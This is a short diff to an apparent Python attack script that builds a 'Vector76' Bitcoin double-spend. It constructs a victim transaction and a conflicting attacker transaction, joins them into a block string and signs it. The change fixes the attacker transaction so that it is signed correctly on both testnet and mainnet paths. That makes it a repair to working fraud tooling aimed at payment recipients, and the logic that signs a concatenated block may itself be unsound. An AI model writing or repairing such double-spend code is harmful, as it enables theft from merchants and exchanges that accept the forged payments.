@@ -117,10 +117,10 @@ tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
 print(tx_victim)
 if testnet:
     tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
-    tx_attacker = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
+    tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, fake_send_from))
 else:
     tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
-    tx_attacker = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))
+    tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, fake_send_from))
 
 vector76_block = f"{tx_victim}{tx_attacker}"
 vector76_block = transaction_util.sign(vector76_block, 0, fake_send_from)
